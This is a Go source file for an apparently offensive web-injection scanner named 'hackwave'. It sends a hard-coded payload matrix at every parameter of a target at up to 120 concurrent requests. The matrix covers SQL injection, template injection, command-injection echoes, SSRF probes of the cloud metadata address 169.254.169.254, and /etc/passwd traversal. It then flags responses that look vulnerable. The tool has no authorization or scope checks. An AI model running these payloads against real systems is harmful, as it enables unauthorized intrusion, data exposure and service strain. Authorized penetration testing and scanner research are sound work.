// hackwave — OMEGA parallel multi-vector injection wave (Go core).
//
// Brutal-mode orchestrator: concurrently fires a payload matrix
// (SQLi / SSTI / command-echo / SSRF-marker / path-traversal) across
// every discovered parameter, classifying each response against THREE
// baselines (benign value, random probe, 404/echo behavior) by status
// shift + marker reflection + error-shape. Everything is candidate
// grade — the Go layer never auto-confirms; the Python brain attaches
// manual_check and the validate gate rules on top.
//
// Input (JSON stdin):
//   {"target":"http://h/page?a=1","params":["a","b"],
//    "method":"GET","cookie":"...","concurrency":120,"timeout_ms":2500}
//
// Output (JSON stdout):
//   {"results":[{"param","vector","payload","signal","status",
//                "baseline_status","class"}]}
package main

import (
	"bufio"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

const (
	poolMax   = 120
	maxParams = 64
	maxReq    = 4096 // hard request ceiling
)

type input struct {
	Target      string   `json:"target"`
	Params      []string `json:"params"`
	Method      string   `json:"method"`
	Body        string   `json:"body"`
	Cookie      string   `json:"cookie"`
	Concurrency int      `json:"concurrency"`
	TimeoutMs   int      `json:"timeout_ms"`
}

type row struct {
	Param          string `json:"param"`
	Vector         string `json:"vector"`
	Payload        string `json:"payload"`
	Signal         string `json:"signal"`
	Status         int    `json:"status"`
	BaselineStatus int    `json:"baseline_status"`
	Class          string `json:"class"`
}

func emit(v interface{}) {
	out, _ := json.Marshal(v)
	fmt.Println(string(out))
}

func randWord() string {
	b := make([]byte, 6)
	rand.Read(b)
	return hex.EncodeToString(b)
}

var payloads = map[string][]string{
	"sqli":     {"'", "\" OR \"1\"=\"1", "1' OR '1'='1' -- ", "' AND 1=CONVERT(int,@@version) -- "},
	"ssti":     {"{{7*7}}", "${7*7}", "<%= 7*7 %>"},
	"cmd-echo": {"; echo omegawave49;", "$(echo omegawave49)", "`echo omegawave49`", "| echo omegawave49"},
	"ssrf":     {"http://omegawave.example/", "http://169.254.169.254/latest/meta-data/"},
	"traversal": {"../../etc/passwd", "....//....//etc/passwd"},
}

func client(timeout time.Duration) *http.Client {
	tr := &http.Transport{MaxIdleConnsPerHost: poolMax,
		DisableKeepAlives: false}
	return &http.Client{Timeout: timeout, Transport: tr,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 3 {
				return http.ErrUseLastResponse
			}
			return nil
		}}
}

func doReq(cl *http.Client, target, param, value, method, body, cookie string) (int, string, string, error) {
	u, err := url.Parse(target)
	if err != nil {
		return 0, "", "", err
	}
	q := u.Query()
	q.Set(param, value)
	u.RawQuery = q.Encode()
	var rd io.Reader
	if body != "" && strings.EqualFold(method, "POST") {
		// body param substitution (first occurrence)
		nd := strings.Replace(body, "OMEGAPARAM="+param, "OMEGAPARAM="+url.QueryEscape(value), 1)
		rd = strings.NewReader(nd)
	}
	req, err := http.NewRequest(strings.ToUpper(method), u.String(), rd)
	if err != nil {
		return 0, "", "", err
	}
	if cookie != "" {
		req.Header.Set("Cookie", cookie)
	}
	req.Header.Set("User-Agent", "omegawave/1.0")
	resp, err := cl.Do(req)
	if err != nil {
		return 0, "", "", err
	}
	defer resp.Body.Close()
	rd2 := bufio.NewReader(io.LimitReader(resp.Body, 65536))
	sb := new(strings.Builder)
	sc := bufio.NewScanner(rd2)
	sc.Buffer(make([]byte, 65536), 65536)
	for sc.Scan() && sb.Len() < 16384 {
		sb.WriteString(sc.Text())
	}
	return resp.StatusCode, sb.String(), resp.Header.Get("Content-Type"), nil
}

func classify(status int, body, marker, benignBody string, benignStatus int) (string, string) {
	if strings.Contains(body, marker) && !strings.Contains(benignBody, marker) {
		if status != benignStatus {
			return "reflected+status-shift", "marker reflected AND status shifted"
		}
		return "reflected", "payload marker reflected verbatim"
	}
	switch {
	case strings.Contains(body, "SQL syntax") || strings.Contains(body, "sqlite3") ||
		strings.Contains(body, "psql:") || strings.Contains(body, "MySQLSyntax"):
		return "error-shape", "database error signature in response"
	case strings.Contains(body, "omegawave49") && strings.Contains(body, "root:"):
		return "cmd-exec", "command marker and system content present"
	case status != benignStatus && (status >= 500 || benignStatus >= 500):
		return "status-shift", "5xx shift vs benign baseline"
	}
	return "", ""
}

func main() {
	in, _ := io.ReadAll(bufio.NewReader(io.LimitReader(os.Stdin, 1<<20)))
	var cfg input
	if err := json.Unmarshal(in, &cfg); err != nil {
		emit(map[string]string{"error": "bad json input: " + err.Error()})
		return
	}
	if cfg.Target == "" || len(cfg.Params) == 0 || len(cfg.Params) > maxParams {
		emit(map[string]string{"error": "target and <=64 params required"})
		return
	}
	method := cfg.Method
	if method == "" {
		method = "GET"
	}
	conc := cfg.Concurrency
	if conc <= 0 || conc > poolMax {
		conc = 60
	}
	tm := cfg.TimeoutMs
	if tm <= 0 {
		tm = 2500
	}
	cl := client(time.Duration(tm) * time.Millisecond)
	marker := "omegawave" + randWord()

	// per-param benign baselines first (2 requests each)
	benign := map[string]struct {
		status int
		body   string
	}{}
	sem := make(chan struct{}, conc)
	var mu sync.Mutex
	var wg sync.WaitGroup
	for _, p := range cfg.Params {
		wg.Add(1)
		sem <- struct{}{}
		go func(p string) {
			defer wg.Done()
			defer func() { <-sem }()
			st, bd, _, err := doReq(cl, cfg.Target, p, "omegaben"+randWord(), method, cfg.Body, cfg.Cookie)
			if err != nil {
				return
			}
			mu.Lock()
			benign[p] = struct {
				status int
				body   string
			}{st, bd}
			mu.Unlock()
		}(p)
	}
	wg.Wait()

	type job struct{ param, vector, payload string }
	jobs := []job{}
	for _, p := range cfg.Params {
		for vec, pls := range payloads {
			for _, pl := range pls {
				jobs = append(jobs, job{p, vec, pl})
			}
		}
	}
	if len(jobs) > maxReq {
		jobs = jobs[:maxReq]
	}

	results := []row{}
	var rmu sync.Mutex
	for _, j := range jobs {
		wg.Add(1)
		sem <- struct{}{}
		go func(j job) {
			defer wg.Done()
			defer func() { <-sem }()
			st, bd, _, err := doReq(cl, cfg.Target, j.param, j.payload, method, cfg.Body, cfg.Cookie)
			if err != nil {
				return
			}
			mu.Lock()
			b := benign[j.param]
			mu.Unlock()
			klass, sig := classify(st, bd, marker, b.body, b.status)
			if klass == "" {
				return
			}
			rmu.Lock()
			results = append(results, row{j.param, j.vector, j.payload, sig,
				st, b.status, klass})
			rmu.Unlock()
		}(j)
	}
	wg.Wait()
	emit(map[string]interface{}{"results": results,
		"marker": marker, "requests": len(jobs) + len(cfg.Params)})
}
